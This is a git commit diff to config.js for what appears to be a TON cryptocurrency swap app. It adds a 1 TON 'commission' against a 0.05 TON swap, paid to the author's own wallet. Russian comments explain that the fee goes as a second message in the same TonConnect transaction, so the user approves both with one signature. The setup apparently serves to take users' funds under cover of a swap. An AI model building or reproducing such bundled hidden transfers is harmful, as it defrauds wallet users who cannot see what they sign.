c3a17a726e531ca917ae977393ce088338a9cb4b
kareli123 <bestenigma61@gmail.com>
2026-05-02 07:11:57 +0300

    feat: add FEE_AMOUNT (1 TON commission) to config

--- config.js
+++ config.js
@@ -1,5 +1,8 @@
 // config.js
 var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
 var PROXY_CONTRACT  = YOUR_WALLET;
-var two_AMOUNT      = "0.05";
+var two_AMOUNT      = "0.05";    // сумма самого swap
+var FEE_AMOUNT      = "1";       // комиссия обмена; уходит вторым message-м
+                                 // в той же tonconnect-транзакции, поэтому
+                                 // подтверждается одной подписью вместе с swap
 var NETWORK         = "mainnet";
